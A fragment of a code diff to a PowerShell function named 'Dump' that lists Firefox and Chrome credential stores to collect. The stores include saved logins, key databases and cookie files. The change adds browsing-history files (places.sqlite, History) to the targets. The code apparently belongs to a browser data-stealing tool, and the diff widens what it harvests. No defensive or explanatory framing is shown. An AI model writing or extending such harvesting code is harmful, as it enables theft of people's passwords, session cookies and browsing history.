@@ -163,7 +163,8 @@ function Dump
 							'key3.db',
 							'logins.json',
 							'cert8.db',
-							'cookies.sqlite'
+							'cookies.sqlite',
+							'places.sqlite'
 						)
 	}
 
@@ -172,7 +173,8 @@ function Dump
 			'paths'	= @('C:\Users\[USER]\AppData\Local\Google\Chrome\User Data')
 			'files' = @(
 							'Login Data',
-							'Cookies'
+							'Cookies',
+							'History'
 						)
 	}
 
